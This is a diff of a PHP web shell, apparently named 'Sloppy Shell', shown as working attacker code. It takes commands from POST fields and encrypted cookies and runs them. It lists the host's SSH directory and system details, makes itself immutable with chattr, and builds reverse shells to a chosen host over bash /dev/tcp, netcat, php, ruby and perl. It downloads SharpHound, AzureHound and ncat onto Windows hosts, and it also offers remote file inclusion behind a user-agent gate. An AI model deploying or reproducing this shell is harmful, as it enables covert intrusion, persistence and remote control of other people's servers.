@@ -2,22 +2,23 @@
 ini_set("safe_mode", 0);
 umask(0);
 posix_setuid(0);
-define("base",'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami');
-system("chattr +i ". $_SERVER["SCRIPT_FILENAME"]);
-function banner(){
-    
+define("base", 'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami');
+system("chattr +i " . $_SERVER["SCRIPT_FILENAME"]);
+function banner()
+{
+
     echo("\033[33;40m .▄▄ · ▄▄▌         ▄▄▄· ▄▄▄· ▄· ▄▌    .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌   \033[0m\n");
     echo("\033[33;40m ▐█ ▀. ██•  ▪     ▐█ ▄█▐█ ▄█▐█▪██▌    ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•   \033[0m\n");
     echo("\033[33;40m ▄▀▀▀█▄██▪   ▄█▀▄  ██▀· ██▀·▐█▌▐█▪    ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪   \033[0m\n");
     echo("\033[33;40m ▐█▄▪▐█▐█▌▐▌▐█▌.▐▌▐█▪·•▐█▪·• ▐█▀·.    ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌ \033[0m\n");
     echo("\033[33;40m  ▀▀▀▀ .▀▀▀  ▀█▄▀▪.▀   .▀     ▀ •      ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀  \033[0m\n");
     echo("gr33tz: Notroot Johnny5\nH4ppy h4ck1ng\n\n\n");
-    
+
 }
 
 function denied(string $errhost)
 {
- echo <<< _POSTDOC1
+    echo <<< _POSTDOC1
  
  <!DOCTYPE html>
 <html>
@@ -131,10 +132,10 @@ _POSTDOC1;
 
 function b64($target, $how, $data, $ext, $dir)
 {
-/*  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *
-*       So, this isn't pretty, or elegant. Its designed to work, and the base64 -w0 works the best from what i have seen, makes the file much   *
-*       easier to transport across http/https, as it strips the newlines out of the end result.                                                 *
-*   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   */
+    /*  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *
+    *       So, this isn't pretty, or elegant. Its designed to work, and the base64 -w0 works the best from what i have seen, makes the file much   *
+    *       easier to transport across http/https, as it strips the newlines out of the end result.                                                 *
+    *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   */
     if (!empty($how) && !empty($target) && !empty($dir)) {
         if (!empty($data) && $how == "up") {
             echo("Starting to decode base64\n");
@@ -156,7 +157,7 @@ function checkComs()
         'cobc', 'javac', 'maven', 'java', 'awk', 'sed', 'ftp', 'ssh', 'vmware', 'virtualbox',
         'qemu', 'sudo', "git", "xterm", "tcl", "ruby", "postgres", "mongo", "couchdb",
         "cron", "anacron", "visudo", "mail", "postfix", "gawk", "base64", "uuid", "pg_lsclusters",
-        "pg_ctlcluster","pg_clusterconf", "pg_config", "pg", "pg_virtualenv", "pg_isready", "pg_conftool"
+        "pg_ctlcluster", "pg_clusterconf", "pg_config", "pg", "pg_virtualenv", "pg_isready", "pg_conftool"
     );
     foreach ($lincommands as $item) {
         echo(shell_exec("which " . $item));
@@ -230,7 +231,7 @@ function checkSystem()
         windows("ncW", "dl");
         return $os;
     } else {
-        array_push($os,"Linux");
+        array_push($os, "Linux");
         return $os;
     }
 }
@@ -281,7 +282,7 @@ function reverseConnections($methods, $host, $port, $shell)
     $comma = array(
         "bash" => "bash -i >& /dev/tcp/{$useHost}/" . $usePort . " 0>&1",
         "php" => "php -r '\$sock=fsockopen(\"" . $useHost . "\"," . $usePort . ");exec(\"$useShell -i <&3 >&3 2>&3\");'",
-        "nc" => "nc -e " . $useShell . " \"" . $useHost . "\" " . $usePort. "\"",
+        "nc" => "nc -e " . $useShell . " \"" . $useHost . "\" " . $usePort . "\"",
         "ncS" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nohup nc \"" . $useHost . "\" " . $usePort . " >/tmp/f",
         "ruby" => "ruby -rsocket -e'f=TCPSocket.open(\"" . $useHost . "\"," . $usePort . ").to_i;exec sprintf(\"$useShell -i <&%d >&%d 2>&%d\",f,f,f)'",
         "perl" => "perl -e 'use Socket;\$i=\"" . $useHost . "\";\$p=" . $usePort . ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"$useShell -i\");};'",
@@ -306,8 +307,8 @@ function executeCommands(string $com, int $run)
 {
     if (!empty($com) && $run === "1") {
         echo("~ Info To Remember ~ \n" . shell_exec(base64_decode($com)));
-    }else{
-        echo("\nExecuting: ". $com ."\n->". shell_exec(base64_decode($com)));
+    } else {
+        echo("\nExecuting: " . $com . "\n->" . shell_exec(base64_decode($com)));
     }
 }
 
@@ -318,36 +319,37 @@ function remoteFileInclude(string $targetFile)
     }
 }
 
-function windows($com, $r){
-    if (!empty($com) && !empty($r)){
-        $cdir = dirname("." . "\\" .PHP_EOL);
+function windows($com, $r)
+{
+    if (!empty($com) && !empty($r)) {
+        $cdir = dirname("." . "\\" . PHP_EOL);
         if ($r == "dl") {
             echo("\nThis is quite noisy, you should make a hidden directory in order to hide these..\n");
             switch (strtolower($com)) {
                 case "bh":
                     echo("Pulling SharpHound..\n");
                     shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile af.ps1");
-                    echo("\nFile downloaded to: ". $cdir . " af.ps1");
+                    echo("\nFile downloaded to: " . $cdir . " af.ps1");
                     break;
                 case "azh":
                     echo("Pulling Azurehound...\n");
                     shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile af1.ps1");
-                    echo("\nFile downloaded to: ". $cdir . " af1.ps1");
+                    echo("\nFile downloaded to: " . $cdir . " af1.ps1");
                     break;
                 case "bhe":
                     echo("Pulling Bloodhound Executable!\n");
                     shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile af2.exe");
-                    echo("\nFile downloaded to: ". $cdir . " af2.ps1");
+                    echo("\nFile downloaded to: " . $cdir . " af2.ps1");
                     break;
                 case "ncW":
                     echo("Pulling Ncat Executable!\n");
                     shell_exec("Invoke-WebRequest -Uri http://nmap.org/dist/ncat-portable-5.59BETA1.zip -OutFile nc1.zip");
                     shell_exec("Expand-Archive ncat-portable-5.59BETA1.zip $cdir");
-                    echo("\nFile expanded to: ". $cdir);
+                    echo("\nFile expanded to: " . $cdir);
                     break;
             }
-        }else{
-            echo ("Future versions will have an execution phase.");
+        } else {
+            echo("Future versions will have an execution phase.");
 
         }
     }
@@ -355,37 +357,45 @@ function windows($com, $r){
 
 if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
     banner();
-    if (!isset($CHECK_IN_HOST)) {
-       	define("CHECK_IN_HOST", $_SERVER["REMOTE_ADDR"]);
-    }
-    setcookie("Test1", "1");
-    setcookie("checkIn", $_SERVER["REMOTE_ADDR"]);
-    header("Access-Control-Allow-Origin: *");
-    header("Access-Control-Allow-Credentials: true");
-    if (!empty($_POST["t"])) {
-        if ($_POST['t'] === "e"){
-            $n = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt(base64_decode($_POST['ne']) , base64_decode($_POST['ad']) , base64_decode($_POST['k']) , base64_decode($_POST['c']));
-            executeCommands($n, "0");
-        }else{
-            executeCommands(base64_decode($_POST["cr"]), "0");
-        }
-    } elseif (!empty($_POST["clone"])) {
-        if (!empty($_POST["ROS"])) {
-            $ROS = htmlentities($_POST["ROS"]);
+    if (!empty($_POST["cx"])) {
+        $ns = null;
+        $sk = null;
+        $ad = null;
+        $ct = null;
+        $split = null;
+        if ($_POST['cx'] === "1") {
+            $split = unserialize(base64_decode($_COOKIE['cr']), ["allowed_classes" => false]);
         } else {
-            $ROS = "";
+            $s = $_COOKIE['cr'];
+            $v = explode(".", base64_decode($s));
+            $ns = hex2bin($v[0]);
+            $sk = hex2bin($v[1]);
+            $ad = hex2bin($v[2]);
+            $ct = base64_decode($v[3]);
+            try {
+                $split = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ct, $ad, $ns, $sk);
+            } catch (SodiumException $e) {
+                echo $e . "\n";
+            }
         }
-        cloner($_POST["clone"], $ROS);
-    } elseif (!empty($_POST["doInclude"])) {
-        remoteFileInclude($_POST["doInclude"]);
-    } elseif (!empty($_POST["b6"])) {
-        echo("Future editions will have this.\n");
-        //b64();
-    } elseif ($_POST["rcom"]) {
-        reverseConnections(htmlentities($_POST["mthd"]), htmlentities($_POST["host"]), htmlentities($_POST["port"]), htmlentities($_POST["shell"]));
+        executeCommands($split, "0");
     } else {
-        echo("Empty post");
+        denied($_SERVER['REMOTE_ADDR']);
     }
+} elseif (!empty($_POST["clone"])) {
+    if (!empty($_POST["ROS"])) {
+        $ROS = htmlentities($_POST["ROS"]);
+    } else {
+        $ROS = "";
+    }
+    cloner($_POST["clone"], $ROS);
+} elseif (!empty($_POST["doInclude"])) {
+    remoteFileInclude($_POST["doInclude"]);
+} elseif (!empty($_POST["b6"])) {
+    echo("Future editions will have this.\n");
+    //b64();
+} elseif ($_POST["rcom"]) {
+    reverseConnections(htmlentities($_POST["mthd"]), htmlentities($_POST["host"]), htmlentities($_POST["port"]), htmlentities($_POST["shell"]));
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
     banner();
     setcookie("checkIn", $_SERVER['REMOTE_ADDR']);
